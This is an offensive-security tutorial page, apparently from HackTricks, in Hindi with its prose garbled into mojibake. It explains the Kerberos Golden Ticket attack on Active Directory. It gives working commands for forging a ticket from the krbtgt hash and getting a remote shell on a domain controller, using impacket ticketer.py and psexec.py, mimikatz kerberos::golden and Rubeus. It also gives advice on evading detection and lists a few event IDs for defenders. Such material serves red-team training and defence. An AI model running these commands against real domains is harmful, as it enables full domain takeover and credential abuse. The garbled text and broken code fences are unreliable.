# рдЧреЛрд▓реНрдбрди рдЯрд┐рдХрдЯ

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ.

</details>

## рдЧреЛрд▓реНрдбрди рдЯрд┐рдХрдЯ

**krbtgt AD рдЕрдХрд╛рдЙрдВрдЯ рдХреЗ NTLM рд╣реИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ** рдХрд┐рд╕реА рднреА рдпреВрдЬрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рдорд╛рдиреНрдп **TGT рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**. TGT рдХреЛ TGS рдХреЗ рдмрдЬрд╛рдп рдмрдирд╛рдиреЗ рдХрд╛ рд▓рд╛рдн рдпрд╣ рд╣реИ рдХрд┐ рдЖрдк рдбреЛрдореЗрди рдореЗрдВ рдХрд┐рд╕реА рднреА рд╕реЗрд╡рд╛ (рдпрд╛ рдорд╢реАрди) рдФрд░ рдЙрд╕ рдпреВрдЬрд░ рдХреЗ рд░реВрдк рдореЗрдВ **рдХрд┐рд╕реА рднреА рд╕реЗрд╡рд╛ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ**.\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛ **krbtgt** рдХреЗ **рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рдХреЛ **рдХрднреА рднреА** рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ **рдмрджрд▓рд╛ рдирд╣реАрдВ рдЬрд╛рддрд╛ рд╣реИ**.

**krbtgt** рдЕрдХрд╛рдЙрдВрдЯ рдХрд╛ **NTLM рд╣реИрд╢** **lsass рдкреНрд░реЛрд╕реЗрд╕** рд╕реЗ рдпрд╛ рдбреЛрдореЗрди рдореЗрдВ рдХрд┐рд╕реА рднреА DC рдХреА **NTDS.dit рдлрд╛рдЗрд▓** рд╕реЗ **рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**. рдпрд╣ NTLM рдПрдХ **DCsync рд╣рдорд▓реЗ** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреА рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ Mimikatz рдХреЗ [lsadump::dcsync](https://github.com/gentilkiwi/mimikatz/wiki/module-\~-lsadump) рдореЙрдбреНрдпреВрд▓ рдпрд╛ impacket рдХреЗ рдЙрджрд╛рд╣рд░рдг [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ. рдЖрдорддреМрд░ рдкрд░, **рдбреЛрдореЗрди рдПрдбрдорд┐рди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдпрд╛ рдЗрд╕реА рддрд░рд╣ рдХреЗ рдЕрдзрд┐рдХрд╛рд░ рдЖрд╡рд╢реНрдпрдХ рд╣реЛрддреЗ рд╣реИрдВ**, рдЪрд╛рд╣реЗ рдХреЛрдИ рднреА рддрдХрдиреАрдХ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХреА рдЬрд╛рдП.

рдпрд╣ рднреА рдзреНрдпрд╛рди рдореЗрдВ рд░рдЦрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдФрд░ **рдкрд╕рдВрджреАрджрд╛** (opsec) рд╣реИ рдХрд┐ **AES Kerberos рдХреБрдВрдЬрд┐рдпреЛрдВ (AES128 рдФрд░ AES256) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЯрд┐рдХрдЯ рдмрдирд╛рдП рдЬрд╛рдПрдВ**.

{% code title="рд▓рд┐рдирдХреНрд╕ рд╕реЗ" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
```
{% endcode %}

{% code title="рд╡рд┐рдВрдбреЛрдЬрд╝ рд╕реЗ" %}
```
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**рдПрдХ рдмрд╛рд░** рдЖрдкрдХреЗ рдкрд╛рд╕ **рдЧреЛрд▓реНрдбрди рдЯрд┐рдХрдЯ рдЗрдВрдЬреЗрдХреНрдЯреЗрдб** рд╣реЛ рдЬрд╛рдиреЗ рдХреЗ рдмрд╛рдж, рдЖрдк рд╕рд╛рдЭрд╛ рдлрд╛рдЗрд▓реЛрдВ **(C$)** рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рд╕реЗрд╡рд╛рдУрдВ рдФрд░ WMI рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЖрдк **psexec** рдпрд╛ **wmiexec** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдЖрдк winrm рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ)ред

### рд╕рд╛рдорд╛рдиреНрдп рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреА рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛

рдЧреЛрд▓реНрдбрди рдЯрд┐рдХрдЯ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд╕рдмрд╕реЗ рдЖрдо рддрд░реАрдХреЗ **рдХреЗрд░реНрдмреЗрд░реЛрд╕ рдЯреНрд░реИрдлрд┐рдХ рдХреА рдЬрд╛рдВрдЪ** рдХрд░рдирд╛ рд╣реИред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, Mimikatz **TGT рдХреЛ 10 рд╡рд░реНрд╖реЛрдВ рдХреЗ рд▓рд┐рдП рд╕рд╛рдЗрди рдХрд░рддрд╛ рд╣реИ**, рдЬреЛ рдЗрд╕рдХреЗ рд╕рд╛рде рдХрд┐рдП рдЧрдП рдмрд╛рдж рдХреЗ TGS рдЕрдиреБрд░реЛрдзреЛрдВ рдореЗрдВ рдЕрд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдкреНрд░рдХрдЯ рд╣реЛрдЧрд╛ред

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдСрдлрд╕реЗрдЯ, рдЕрд╡рдзрд┐ рдФрд░ рдЕрдзрд┐рдХрддрдо рдирд╡реАрдХрд░рдг (рд╕рднреА рдорд┐рдирдЯреЛрдВ рдореЗрдВ) рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `/startoffset`, `/endin` рдФрд░ `/renewmax` рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
```
Get-DomainPolicy | select -expand KerberosPolicy
```
```markdown
рджреБрд░реНрднрд╛рдЧреНрдпрд╡рд╢, TGT рдХреА рдЬреАрд╡рдирдХрд╛рд▓ 4769 рдХреЗ рд▓реЙрдЧ рдореЗрдВ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдпрд╣ рдЬрд╛рдирдХрд╛рд░реА Windows рдЗрд╡реЗрдВрдЯ рд▓реЙрдЧреНрд╕ рдореЗрдВ рдирд╣реАрдВ рдорд┐рд▓реЗрдЧреАред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЬреЛ рдЖрдк рд╕рд╣рд╕рдВрдмрдВрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╡рд╣ рд╣реИ **4769 рдХреЛ рджреЗрдЦрдирд╛ **_**рдмрд┐рдирд╛**_** рдкреВрд░реНрд╡ 4768 рдХреЗ**ред TGS рдХреА рдорд╛рдВрдЧ TGT рдХреЗ рдмрд┐рдирд╛ **рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ**, рдФрд░ рдЕрдЧрд░ TGT рдЬрд╛рд░реА рдХрд┐рдП рдЬрд╛рдиреЗ рдХрд╛ рдХреЛрдИ рд░рд┐рдХреЙрд░реНрдб рдирд╣реАрдВ рд╣реИ, рддреЛ рд╣рдо рдпрд╣ рдирд┐рд╖реНрдХрд░реНрд╖ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЗрд╕реЗ рдСрдлрд▓рд╛рдЗрди рдЬрд╛рд▓реА рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдерд╛ред

рдЗрд╕ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЛ **рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдбрд╛рдпрдордВрдб рдЯрд┐рдХрдЯреНрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### рдЙрдкрд╛рдп

* 4624: рдЕрдХрд╛рдЙрдВрдЯ рд▓реЙрдЧрдСрди
* 4672: рдПрдбрдорд┐рди рд▓реЙрдЧрдСрди
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List тАУProperty`

рдЕрдиреНрдп рдЫреЛрдЯреА рдЪрд╛рд▓реЗрдВ рдЬреЛ рдбрд┐рдлреЗрдВрдбрд░реНрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╡рд╣ рд╣реИ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП 4769 рдХреЗ рдЕрд▓рд░реНрдЯ** рдЬреИрд╕реЗ рдХрд┐ рдбрд┐рдлреЙрд▓реНрдЯ рдбреЛрдореЗрди рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░ рдЕрдХрд╛рдЙрдВрдЯред

[**Golden Ticket рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА ired.team рдкрд░ред**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХреЛ рдлреЙрд▓реЛ рдХрд░реЗрдВред**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВред

</details>
```
